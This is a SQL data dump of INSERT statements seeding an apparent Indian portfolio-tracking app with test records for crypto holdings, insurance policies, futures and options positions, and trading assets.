INSERT INTO "manual_cryptocurrency_holdings" ("id", "user_id", "crypto_symbol", "crypto_name", "platform", "wallet_type", "wallet_address", "purchase_date", "quantity", "purchase_rate_inr", "purchase_amount", "transaction_fee", "gas_fee", "other_charges", "total_investment", "transaction_id", "transaction_hash", "current_rate_inr", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "is_staked", "staking_platform", "staking_apy", "staking_rewards_earned", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (11, 34, 'USDT', 'Tether', 'WazirX', 'Exchange Wallet', NULL, '2024-09-01', 1500.0, 83.5, 125250.0, NULL, NULL, NULL, 125250.0, NULL, NULL, 84.2, 126300.0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, TRUE, '2025-10-31T16:41:22.775619', '2025-10-31T16:41:22.775619', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_cryptocurrency_holdings" ("id", "user_id", "crypto_symbol", "crypto_name", "platform", "wallet_type", "wallet_address", "purchase_date", "quantity", "purchase_rate_inr", "purchase_amount", "transaction_fee", "gas_fee", "other_charges", "total_investment", "transaction_id", "transaction_hash", "current_rate_inr", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "is_staked", "staking_platform", "staking_apy", "staking_rewards_earned", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (12, 35, 'BTC', 'Bitcoin', 'CoinSwitch', 'Exchange Wallet', NULL, '2023-11-10', 0.04, 2850000.0, 114000.0, NULL, NULL, NULL, 114000.0, NULL, NULL, 5850000.0, 234000.0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, TRUE, '2025-10-31T16:41:27.609037', '2025-10-31T16:41:27.609037', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_cryptocurrency_holdings" ("id", "user_id", "crypto_symbol", "crypto_name", "platform", "wallet_type", "wallet_address", "purchase_date", "quantity", "purchase_rate_inr", "purchase_amount", "transaction_fee", "gas_fee", "other_charges", "total_investment", "transaction_id", "transaction_hash", "current_rate_inr", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "is_staked", "staking_platform", "staking_apy", "staking_rewards_earned", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (13, 35, 'ETH', 'Ethereum', 'WazirX', 'Exchange Wallet', NULL, '2024-03-15', 1.0, 165000.0, 165000.0, NULL, NULL, NULL, 165000.0, NULL, NULL, 280000.0, 280000.0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, TRUE, '2025-10-31T16:41:27.609037', '2025-10-31T16:41:27.609037', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_cryptocurrency_holdings" ("id", "user_id", "crypto_symbol", "crypto_name", "platform", "wallet_type", "wallet_address", "purchase_date", "quantity", "purchase_rate_inr", "purchase_amount", "transaction_fee", "gas_fee", "other_charges", "total_investment", "transaction_id", "transaction_hash", "current_rate_inr", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "is_staked", "staking_platform", "staking_apy", "staking_rewards_earned", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (14, 35, 'SOL', 'Solana', 'CoinDCX', 'Exchange Wallet', NULL, '2024-07-20', 15.0, 9500.0, 142500.0, NULL, NULL, NULL, 142500.0, NULL, NULL, 15800.0, 237000.0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, TRUE, '2025-10-31T16:41:27.609037', '2025-10-31T16:41:27.609037', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_cryptocurrency_holdings" ("id", "user_id", "crypto_symbol", "crypto_name", "platform", "wallet_type", "wallet_address", "purchase_date", "quantity", "purchase_rate_inr", "purchase_amount", "transaction_fee", "gas_fee", "other_charges", "total_investment", "transaction_id", "transaction_hash", "current_rate_inr", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "is_staked", "staking_platform", "staking_apy", "staking_rewards_earned", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (15, 27, 'BTC', 'Bitcoin', 'CoinDCX', 'Exchange Wallet', 'er24245252552', '2025-12-01', 1.0, 10000000.0, 10000000.0, 20000.0, 0.0, 0.0, 10020000.0, 'weewewewewe', 'ewewewe', 11000000.0, 11000000.0, NULL, 980000.0, 9.780439121756487, FALSE, '', NULL, 0.0, 'Default', 'Cryptocurrency', '', TRUE, '2025-12-26T15:02:39.987875', '2025-12-26T15:02:39.987878', NULL, 'live') ON CONFLICT DO NOTHING;

-- Table: manual_insurance_holdings
-- Exported: 2026-01-25T05:09:41.600521
-- Rows: 15

INSERT INTO "manual_insurance_holdings" ("id", "user_id", "insurance_type", "policy_name", "policy_number", "insurance_company", "policy_holder_name", "insured_person_name", "sum_assured", "policy_term_years", "premium_amount", "premium_frequency", "premium_payment_term_years", "total_premiums_paid", "policy_start_date", "policy_end_date", "maturity_date", "next_premium_due_date", "maturity_amount", "bonus_accumulated", "surrender_value", "nominee_name", "nominee_relation", "agent_name", "agent_contact", "policy_status", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (1, 30, 'Term Life', 'HDFC Life Click 2 Protect Plus', 'HDFC/TERM/12345678', 'HDFC Life Insurance', 'Test User', 'Test User', 10000000.0, 30, 12500.0, 'Annual', 30, 62500.0, '2019-04-01', '2049-03-31', '2049-03-31', '2025-04-01', 0.0, 0.0, NULL, 'Spouse Name', 'Spouse', 'Rajesh Kumar', '+91-9876543210', 'Active', 'Life Insurance', 'Insurance', NULL, TRUE, '2025-10-23T03:34:08.297985', '2025-10-23T03:34:08.297989', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_insurance_holdings" ("id", "user_id", "insurance_type", "policy_name", "policy_number", "insurance_company", "policy_holder_name", "insured_person_name", "sum_assured", "policy_term_years", "premium_amount", "premium_frequency", "premium_payment_term_years", "total_premiums_paid", "policy_start_date", "policy_end_date", "maturity_date", "next_premium_due_date", "maturity_amount", "bonus_accumulated", "surrender_value", "nominee_name", "nominee_relation", "agent_name", "agent_contact", "policy_status", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (2, 30, 'Life (Endowment)', 'LIC Jeevan Anand', 'LIC/512345678', 'LIC of India', 'Test User', 'Test User', 2000000.0, 25, 45000.0, 'Annual', 20, 450000.0, '2014-06-15', '2039-06-14', '2039-06-14', '2025-06-15', 2500000.0, 350000.0, 420000.0, 'Parent Name', 'Parent', 'Suresh Sharma', '+91-9765432109', 'Active', 'Endowment Plans', 'Insurance', NULL, TRUE, '2025-10-23T03:34:08.392952', '2025-10-23T03:34:08.392956', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_insurance_holdings" ("id", "user_id", "insurance_type", "policy_name", "policy_number", "insurance_company", "policy_holder_name", "insured_person_name", "sum_assured", "policy_term_years", "premium_amount", "premium_frequency", "premium_payment_term_years", "total_premiums_paid", "policy_start_date", "policy_end_date", "maturity_date", "next_premium_due_date", "maturity_amount", "bonus_accumulated", "surrender_value", "nominee_name", "nominee_relation", "agent_name", "agent_contact", "policy_status", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (3, 30, 'Health', 'Star Health Comprehensive Insurance', 'STAR/HLT/987654321', 'Star Health Insurance', 'Test User', 'Self & Family (4 members)', 1000000.0, 1, 28000.0, 'Annual', 1, 84000.0, '2024-08-01', '2025-07-31', NULL, '2025-08-01', NULL, 0.0, NULL, 'Spouse Name', 'Spouse', 'Priya Desai', '+91-9654321098', 'Active', 'Health Insurance', 'Insurance', 'Family Floater: Self, Spouse, 2 Children. Coverage includes pre and post hospitalization, room rent, ICU charges.', TRUE, '2025-10-23T03:34:08.467553', '2025-10-23T03:34:08.467556', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_insurance_holdings" ("id", "user_id", "insurance_type", "policy_name", "policy_number", "insurance_company", "policy_holder_name", "insured_person_name", "sum_assured", "policy_term_years", "premium_amount", "premium_frequency", "premium_payment_term_years", "total_premiums_paid", "policy_start_date", "policy_end_date", "maturity_date", "next_premium_due_date", "maturity_amount", "bonus_accumulated", "surrender_value", "nominee_name", "nominee_relation", "agent_name", "agent_contact", "policy_status", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (4, 30, 'Health (Critical Illness)', 'ICICI Lombard Cancer Care Plus', 'ICICI/CI/456789012', 'ICICI Lombard General Insurance', 'Test User', 'Test User', 5000000.0, 10, 18000.0, 'Annual', 10, 54000.0, '2022-01-10', '2032-01-09', NULL, '2025-01-10', NULL, 0.0, NULL, 'Spouse Name', 'Spouse', 'Amit Patel', '+91-9543210987', 'Active', 'Critical Illness Cover', 'Insurance', 'Covers 36+ critical illnesses including cancer, heart attack, stroke, organ failure.', TRUE, '2025-10-23T03:34:08.467558', '2025-10-23T03:34:08.467559', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_insurance_holdings" ("id", "user_id", "insurance_type", "policy_name", "policy_number", "insurance_company", "policy_holder_name", "insured_person_name", "sum_assured", "policy_term_years", "premium_amount", "premium_frequency", "premium_payment_term_years", "total_premiums_paid", "policy_start_date", "policy_end_date", "maturity_date", "next_premium_due_date", "maturity_amount", "bonus_accumulated", "surrender_value", "nominee_name", "nominee_relation", "agent_name", "agent_contact", "policy_status", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (5, 30, 'Motor (Car)', 'Bajaj Allianz Comprehensive Car Insurance', 'BAJAJ/CAR/123456789', 'Bajaj Allianz General Insurance', 'Test User', 'Honda City VX (KA-01-AB-1234)', 1200000.0, 1, 18500.0, 'Annual', 1, 18500.0, '2024-09-01', '2025-08-31', NULL, '2025-09-01', NULL, 0.0, NULL, NULL, NULL, 'Auto Dealership', '+91-9432109876', 'Active', 'Motor Insurance', 'Insurance', 'Comprehensive coverage with zero depreciation add-on, engine protection, roadside assistance, NCB 35%', TRUE, '2025-10-23T03:34:08.467560', '2025-10-23T03:34:08.467561', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_insurance_holdings" ("id", "user_id", "insurance_type", "policy_name", "policy_number", "insurance_company", "policy_holder_name", "insured_person_name", "sum_assured", "policy_term_years", "premium_amount", "premium_frequency", "premium_payment_term_years", "total_premiums_paid", "policy_start_date", "policy_end_date", "maturity_date", "next_premium_due_date", "maturity_amount", "bonus_accumulated", "surrender_value", "nominee_name", "nominee_relation", "agent_name", "agent_contact", "policy_status", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (6, 30, 'Motor (Two Wheeler)', 'HDFC ERGO Bike Insurance', 'HDFC/BIKE/987654321', 'HDFC ERGO General Insurance', 'Test User', 'Honda Activa (KA-02-XY-5678)', 75000.0, 1, 2800.0, 'Annual', 1, 2800.0, '2024-07-15', '2025-07-14', NULL, '2025-07-15', NULL, 0.0, NULL, NULL, NULL, 'Online Purchase', NULL, 'Active', 'Motor Insurance', 'Insurance', 'Comprehensive policy with personal accident cover ₹15 lakhs', TRUE, '2025-10-23T03:34:08.467562', '2025-10-23T03:34:08.467562', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_insurance_holdings" ("id", "user_id", "insurance_type", "policy_name", "policy_number", "insurance_company", "policy_holder_name", "insured_person_name", "sum_assured", "policy_term_years", "premium_amount", "premium_frequency", "premium_payment_term_years", "total_premiums_paid", "policy_start_date", "policy_end_date", "maturity_date", "next_premium_due_date", "maturity_amount", "bonus_accumulated", "surrender_value", "nominee_name", "nominee_relation", "agent_name", "agent_contact", "policy_status", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (7, 30, 'Home Insurance', 'New India Home Protect Plan', 'NIA/HOME/111222333', 'New India Assurance', 'Test User', '3 BHK Apartment - Prestige Lakeside', 5000000.0, 1, 12000.0, 'Annual', 1, 36000.0, '2024-03-01', '2025-02-28', NULL, '2025-03-01', NULL, 0.0, NULL, NULL, NULL, 'Insurance Broker', '+91-9321098765', 'Active', 'Property Insurance', 'Insurance', 'Covers: Building Structure ₹35L, Contents ₹15L, Burglary ₹5L, Public Liability ₹10L', TRUE, '2025-10-23T03:34:08.467563', '2025-10-23T03:34:08.467564', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_insurance_holdings" ("id", "user_id", "insurance_type", "policy_name", "policy_number", "insurance_company", "policy_holder_name", "insured_person_name", "sum_assured", "policy_term_years", "premium_amount", "premium_frequency", "premium_payment_term_years", "total_premiums_paid", "policy_start_date", "policy_end_date", "maturity_date", "next_premium_due_date", "maturity_amount", "bonus_accumulated", "surrender_value", "nominee_name", "nominee_relation", "agent_name", "agent_contact", "policy_status", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (8, 30, 'Personal Accident', 'TATA AIG Personal Accident Policy', 'TATA/PA/444555666', 'TATA AIG General Insurance', 'Test User', 'Test User', 10000000.0, 1, 3500.0, 'Annual', 1, 7000.0, '2024-05-01', '2025-04-30', NULL, '2025-05-01', NULL, 0.0, NULL, 'Spouse Name', 'Spouse', 'Online Purchase', NULL, 'Active', 'Accident Cover', 'Insurance', 'Coverage: Accidental Death ₹1Cr, Permanent Total Disability ₹1Cr, Medical Expenses ₹10L', TRUE, '2025-10-23T03:34:08.467565', '2025-10-23T03:34:08.467565', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_insurance_holdings" ("id", "user_id", "insurance_type", "policy_name", "policy_number", "insurance_company", "policy_holder_name", "insured_person_name", "sum_assured", "policy_term_years", "premium_amount", "premium_frequency", "premium_payment_term_years", "total_premiums_paid", "policy_start_date", "policy_end_date", "maturity_date", "next_premium_due_date", "maturity_amount", "bonus_accumulated", "surrender_value", "nominee_name", "nominee_relation", "agent_name", "agent_contact", "policy_status", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (9, 34, 'Term Life', 'HDFC Life Click 2 Protect', 'HDFC-TERM-2023-45678', 'HDFC Life Insurance', 'Target Plus User', NULL, 10000000.0, 30, 18500.0, 'Annual', 30, 37000.0, '2023-01-15', NULL, '2053-01-15', NULL, 0.0, NULL, NULL, NULL, NULL, NULL, NULL, 'Active', NULL, NULL, NULL, TRUE, '2025-10-31T16:40:46.500208', '2025-10-31T16:40:46.500208', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_insurance_holdings" ("id", "user_id", "insurance_type", "policy_name", "policy_number", "insurance_company", "policy_holder_name", "insured_person_name", "sum_assured", "policy_term_years", "premium_amount", "premium_frequency", "premium_payment_term_years", "total_premiums_paid", "policy_start_date", "policy_end_date", "maturity_date", "next_premium_due_date", "maturity_amount", "bonus_accumulated", "surrender_value", "nominee_name", "nominee_relation", "agent_name", "agent_contact", "policy_status", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (10, 34, 'Health Insurance', 'Star Health Comprehensive', 'STAR-HEALTH-2024-12345', 'Star Health Insurance', 'Target Plus User', NULL, 1000000.0, 1, 25000.0, 'Annual', 1, 25000.0, '2024-04-01', NULL, '2025-04-01', NULL, 0.0, NULL, NULL, NULL, NULL, NULL, NULL, 'Active', NULL, NULL, NULL, TRUE, '2025-10-31T16:40:46.500208', '2025-10-31T16:40:46.500208', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_insurance_holdings" ("id", "user_id", "insurance_type", "policy_name", "policy_number", "insurance_company", "policy_holder_name", "insured_person_name", "sum_assured", "policy_term_years", "premium_amount", "premium_frequency", "premium_payment_term_years", "total_premiums_paid", "policy_start_date", "policy_end_date", "maturity_date", "next_premium_due_date", "maturity_amount", "bonus_accumulated", "surrender_value", "nominee_name", "nominee_relation", "agent_name", "agent_contact", "policy_status", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (11, 34, 'ULIP', 'ICICI Pru Signature', 'ICICI-ULIP-2021-98765', 'ICICI Prudential Life', 'Target Plus User', NULL, 1500000.0, 15, 50000.0, 'Annual', 10, 200000.0, '2021-06-01', NULL, '2036-06-01', NULL, 875000.0, NULL, NULL, NULL, NULL, NULL, NULL, 'Active', NULL, NULL, NULL, TRUE, '2025-10-31T16:40:46.500208', '2025-10-31T16:40:46.500208', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_insurance_holdings" ("id", "user_id", "insurance_type", "policy_name", "policy_number", "insurance_company", "policy_holder_name", "insured_person_name", "sum_assured", "policy_term_years", "premium_amount", "premium_frequency", "premium_payment_term_years", "total_premiums_paid", "policy_start_date", "policy_end_date", "maturity_date", "next_premium_due_date", "maturity_amount", "bonus_accumulated", "surrender_value", "nominee_name", "nominee_relation", "agent_name", "agent_contact", "policy_status", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (12, 35, 'Term Life', 'Max Life Smart Secure Plus', 'MAX-TERM-2022-88990', 'Max Life Insurance', 'Target Pro User', NULL, 25000000.0, 35, 42000.0, 'Annual', 35, 126000.0, '2022-02-10', NULL, '2057-02-10', NULL, 0.0, NULL, NULL, NULL, NULL, NULL, NULL, 'Active', NULL, NULL, NULL, TRUE, '2025-10-31T16:40:54.760840', '2025-10-31T16:40:54.760840', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_insurance_holdings" ("id", "user_id", "insurance_type", "policy_name", "policy_number", "insurance_company", "policy_holder_name", "insured_person_name", "sum_assured", "policy_term_years", "premium_amount", "premium_frequency", "premium_payment_term_years", "total_premiums_paid", "policy_start_date", "policy_end_date", "maturity_date", "next_premium_due_date", "maturity_amount", "bonus_accumulated", "surrender_value", "nominee_name", "nominee_relation", "agent_name", "agent_contact", "policy_status", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (13, 35, 'Health Insurance', 'Niva Bupa Aspire Platinum', 'NIVA-HEALTH-2024-55443', 'Niva Bupa Health', 'Target Pro User', NULL, 2000000.0, 1, 45000.0, 'Annual', 1, 45000.0, '2024-05-15', NULL, '2025-05-15', NULL, 0.0, NULL, NULL, NULL, NULL, NULL, NULL, 'Active', NULL, NULL, NULL, TRUE, '2025-10-31T16:40:54.760840', '2025-10-31T16:40:54.760840', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_insurance_holdings" ("id", "user_id", "insurance_type", "policy_name", "policy_number", "insurance_company", "policy_holder_name", "insured_person_name", "sum_assured", "policy_term_years", "premium_amount", "premium_frequency", "premium_payment_term_years", "total_premiums_paid", "policy_start_date", "policy_end_date", "maturity_date", "next_premium_due_date", "maturity_amount", "bonus_accumulated", "surrender_value", "nominee_name", "nominee_relation", "agent_name", "agent_contact", "policy_status", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (14, 35, 'Endowment', 'LIC Jeevan Anand', 'LIC-ENDOW-2020-77665', 'LIC of India', 'Target Pro User', NULL, 2500000.0, 20, 85000.0, 'Annual', 15, 425000.0, '2020-08-01', NULL, '2040-08-01', NULL, 3750000.0, NULL, NULL, NULL, NULL, NULL, NULL, 'Active', NULL, NULL, NULL, TRUE, '2025-10-31T16:40:54.760840', '2025-10-31T16:40:54.760840', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_insurance_holdings" ("id", "user_id", "insurance_type", "policy_name", "policy_number", "insurance_company", "policy_holder_name", "insured_person_name", "sum_assured", "policy_term_years", "premium_amount", "premium_frequency", "premium_payment_term_years", "total_premiums_paid", "policy_start_date", "policy_end_date", "maturity_date", "next_premium_due_date", "maturity_amount", "bonus_accumulated", "surrender_value", "nominee_name", "nominee_relation", "agent_name", "agent_contact", "policy_status", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (15, 35, 'Motor Insurance', 'HDFC ERGO Car Comprehensive', 'HDFC-MOTOR-2024-33221', 'HDFC ERGO', 'Target Pro User', NULL, 1200000.0, 1, 28000.0, 'Annual', 1, 28000.0, '2024-07-20', NULL, '2025-07-20', NULL, 0.0, NULL, NULL, NULL, NULL, NULL, NULL, 'Active', NULL, NULL, NULL, TRUE, '2025-10-31T16:40:54.760840', '2025-10-31T16:40:54.760840', NULL, 'live') ON CONFLICT DO NOTHING;

-- Table: manual_futures_options_holdings
-- Exported: 2026-01-25T05:09:41.902176
-- Rows: 7

INSERT INTO "manual_futures_options_holdings" ("id", "user_id", "contract_type", "underlying_asset", "symbol", "strike_price", "lot_size", "quantity_lots", "total_quantity", "expiry_date", "trade_date", "position_type", "entry_price", "premium_paid", "brokerage", "stt", "exchange_charges", "gst", "other_charges", "total_charges", "total_investment", "current_market_price", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "position_status", "exit_price", "exit_date", "realized_pnl", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (1, 30, 'Future', 'NIFTY', 'NIFTY24OCTFUT', NULL, 50, 2, 100, '2024-10-31', '2024-10-15', 'Long', 24500.0, 0.0, 100.0, 122.5, 50.0, 30.6, 0.0, 303.1, 2450303.1, 24750.0, 2475000.0, 24696.899999999907, 1.0079120415755873, 'Open', NULL, NULL, NULL, 'F&O Trading', 'F&O', NULL, TRUE, '2025-10-23T03:07:07.713691', '2025-10-23T03:07:07.713693', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_futures_options_holdings" ("id", "user_id", "contract_type", "underlying_asset", "symbol", "strike_price", "lot_size", "quantity_lots", "total_quantity", "expiry_date", "trade_date", "position_type", "entry_price", "premium_paid", "brokerage", "stt", "exchange_charges", "gst", "other_charges", "total_charges", "total_investment", "current_market_price", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "position_status", "exit_price", "exit_date", "realized_pnl", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (2, 30, 'Call Option', 'RELIANCE', 'RELIANCE24OCT2700CE', 2700.0, 250, 1, 250, '2024-10-31', '2024-10-18', 'Long', 45.0, 11250.0, 50.0, 28.13, 20.0, 17.66, 0.0, 115.78999999999999, 2812615.79, 62.0, 15500.0, -2797115.79, -99.4489115770768, 'Open', NULL, NULL, NULL, 'Options', 'F&O', NULL, TRUE, '2025-10-23T03:07:07.791279', '2025-10-23T03:07:07.791282', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_futures_options_holdings" ("id", "user_id", "contract_type", "underlying_asset", "symbol", "strike_price", "lot_size", "quantity_lots", "total_quantity", "expiry_date", "trade_date", "position_type", "entry_price", "premium_paid", "brokerage", "stt", "exchange_charges", "gst", "other_charges", "total_charges", "total_investment", "current_market_price", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "position_status", "exit_price", "exit_date", "realized_pnl", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (3, 30, 'Put Option', 'BANKNIFTY', 'BANKNIFTY24NOV51500PE', 51500.0, 15, 2, 30, '2024-11-28', '2024-10-20', 'Long', 180.0, 5400.0, 40.0, 13.5, 15.0, 12.33, 0.0, 80.83, 162080.83, 215.0, 6450.0, -155630.83, -96.02050409045906, 'Open', NULL, NULL, NULL, 'Options', 'F&O', NULL, TRUE, '2025-10-23T03:07:07.791282', '2025-10-23T03:07:07.791283', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_futures_options_holdings" ("id", "user_id", "contract_type", "underlying_asset", "symbol", "strike_price", "lot_size", "quantity_lots", "total_quantity", "expiry_date", "trade_date", "position_type", "entry_price", "premium_paid", "brokerage", "stt", "exchange_charges", "gst", "other_charges", "total_charges", "total_investment", "current_market_price", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "position_status", "exit_price", "exit_date", "realized_pnl", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (4, 30, 'Future', 'TCS', 'TCS24OCTFUT', NULL, 125, 1, 125, '2024-10-31', '2024-10-10', 'Long', 3420.0, 0.0, 75.0, 53.38, 25.0, 27.61, 0.0, 180.99, 427680.99, 3475.0, 434375.0, 6694.010000000009, 1.565187641377282, 'Open', NULL, NULL, NULL, 'Stock Futures', 'F&O', NULL, TRUE, '2025-10-23T03:07:07.865537', '2025-10-23T03:07:07.865542', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_futures_options_holdings" ("id", "user_id", "contract_type", "underlying_asset", "symbol", "strike_price", "lot_size", "quantity_lots", "total_quantity", "expiry_date", "trade_date", "position_type", "entry_price", "premium_paid", "brokerage", "stt", "exchange_charges", "gst", "other_charges", "total_charges", "total_investment", "current_market_price", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "position_status", "exit_price", "exit_date", "realized_pnl", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (5, 35, 'CALL', 'NIFTY', 'NIFTY 28NOV24 22000 CE', 22000.0, 50, 2, 100, '2024-11-28', '2024-10-25', 'LONG', 185.5, 18550.0, NULL, NULL, NULL, NULL, NULL, NULL, 18550.0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, TRUE, '2025-10-31T16:40:25.811177', '2025-10-31T16:40:25.811177', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_futures_options_holdings" ("id", "user_id", "contract_type", "underlying_asset", "symbol", "strike_price", "lot_size", "quantity_lots", "total_quantity", "expiry_date", "trade_date", "position_type", "entry_price", "premium_paid", "brokerage", "stt", "exchange_charges", "gst", "other_charges", "total_charges", "total_investment", "current_market_price", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "position_status", "exit_price", "exit_date", "realized_pnl", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (6, 35, 'PUT', 'BANKNIFTY', 'BANKNIFTY 28NOV24 48000 PE', 48000.0, 25, 1, 25, '2024-11-28', '2024-10-28', 'LONG', 220.0, 5500.0, NULL, NULL, NULL, NULL, NULL, NULL, 5500.0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, TRUE, '2025-10-31T16:40:25.811177', '2025-10-31T16:40:25.811177', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_futures_options_holdings" ("id", "user_id", "contract_type", "underlying_asset", "symbol", "strike_price", "lot_size", "quantity_lots", "total_quantity", "expiry_date", "trade_date", "position_type", "entry_price", "premium_paid", "brokerage", "stt", "exchange_charges", "gst", "other_charges", "total_charges", "total_investment", "current_market_price", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "position_status", "exit_price", "exit_date", "realized_pnl", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (7, 35, 'FUTURE', 'RELIANCE', 'RELIANCE 28NOV24 FUT', 2850.0, 250, 1, 250, '2024-11-28', '2024-10-20', 'LONG', 2840.0, 0.0, NULL, NULL, NULL, NULL, NULL, NULL, 710000.0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, TRUE, '2025-10-31T16:40:25.811177', '2025-10-31T16:40:25.811177', NULL, 'live') ON CONFLICT DO NOTHING;

-- Table: trading_assets
-- Exported: 2026-01-25T05:09:42.219855
-- Rows: 8

INSERT INTO "trading_assets" ("id", "symbol", "company_name", "asset_class", "exchange", "sector", "current_price", "is_active", "lot_size", "created_at", "updated_at", "tenant_id") VALUES (9, 'NIFTY', 'Nifty 50 Index', 'stocks', 'NSE', 'Index', NULL, TRUE, 50, '2025-10-21T13:49:57.710815', '2025-10-21T13:49:57.710818', 'live') ON CONFLICT DO NOTHING;
INSERT INTO "trading_assets" ("id", "symbol", "company_name", "asset_class", "exchange", "sector", "current_price", "is_active", "lot_size", "created_at", "updated_at", "tenant_id") VALUES (10, 'BANKNIFTY', 'Bank Nifty Index', 'stocks', 'NSE', 'Banking', NULL, TRUE, 25, '2025-10-21T13:49:57.710819', '2025-10-21T13:49:57.710819', 'live') ON CONFLICT DO NOTHING;
INSERT INTO "trading_assets" ("id", "symbol", "company_name", "asset_class", "exchange", "sector", "current_price", "is_active", "lot_size", "created_at", "updated_at", "tenant_id") VALUES (11, 'RELIANCE', 'Reliance Industries Limited', 'stocks', 'NSE', 'Oil & Gas', NULL, TRUE, 1, '2025-10-21T13:49:57.710819', '2025-10-21T13:49:57.710820', 'live') ON CONFLICT DO NOTHING;
INSERT INTO "trading_assets" ("id", "symbol", "company_name", "asset_class", "exchange", "sector", "current_price", "is_active", "lot_size", "created_at", "updated_at", "tenant_id") VALUES (12, 'HDFCBANK', 'HDFC Bank Limited', 'stocks', 'NSE', 'Banking', NULL, TRUE, 1, '2025-10-21T13:49:57.710820', '2025-10-21T13:49:57.710820', 'live') ON CONFLICT DO NOTHING;
